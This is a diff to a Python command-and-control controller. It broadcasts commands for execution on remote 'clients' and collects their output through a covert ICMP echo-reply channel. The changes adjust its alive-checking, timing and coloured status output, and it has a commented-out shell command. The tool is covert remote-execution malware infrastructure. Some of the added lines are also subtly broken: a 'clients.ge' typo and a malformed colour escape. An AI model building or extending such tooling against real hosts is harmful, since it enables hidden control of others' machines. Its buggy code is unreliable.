@@ -130,6 +130,7 @@ def sendtoall(arguments, clients, execute):
             if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
             elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
 
+# Is this redundant? Yes. Am I fixing it? No.
 def exeonall(arguments, clients, execute):
     global SuperSecretMode
     if len(arguments)<3 or arguments[1] == "": 
@@ -205,8 +206,10 @@ def listen(pkt):
         if command[0] == "$":
             output = encrypt_decrypt(command[1:])
             newlineparsed = output.replace("\\\\n","\n")
+            newlineparsed = newlineparsed.replace("s\'n","\n")
+            newlineparsed = newlineparsed.replace(":s&","\n")
             print(f"Recieved from {src}:\n\t{newlineparsed}")
-            check_alive(src, command)
+            check_alive(src, output)
         else: 
             newlineparsed = command[2:].replace("\\\\n","\n")
             print(f"Recieved from {src}:\n\t{command[0:2]} {newlineparsed}")
@@ -214,18 +217,20 @@ def listen(pkt):
 
 def check_alive(src, command):
     global ALIVE
-    if "ALIVE!" in command:
+    if "alive" in command:
         ALIVE[src] = True
+    else:
+        ALIVE[src] = False
 
 def show_alive(clients):
     global ALIVE
     for value in ALIVE:
         print(value)
         if ALIVE[value] == True:
-            print(f"['\033[92m'{clients[value]}]"'\033[0m', end=" ")
-        else: 
-            print(f"'\033[91m'{clients[value]}]'\033[0m'", end=" ")
-        print()
+            print(f"\033[92m[{clients[value]}]\033[0m", end=" ")
+        elif ALIVE[value] == False: 
+            print(f"\03391m[{clients[value]}]\033[0m", end=" ")
+    print()
 
 def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
@@ -278,10 +283,11 @@ def main():
         elif arguments[0] == "exeonteam":
             exeonteam(arguments, clients, execute=True)
         elif arguments[0] == "checkalive":
-            arguments = ["checkalive", "ALIVE"]
+            for client in clients: ALIVE[clients.ge(client)] = False
+            arguments = ["checkalive", "alive"]
             sendtoall(arguments, clients, execute=False)
+            time.sleep(7)
             show_alive(clients)
-            time.sleep(5)
         elif arguments[0] == "loadclients":
             id = generate_targets(JSONFILE, clients, id)
         # elif arguments[0] == "shell":  [DONT WORRY ABOUT IT]
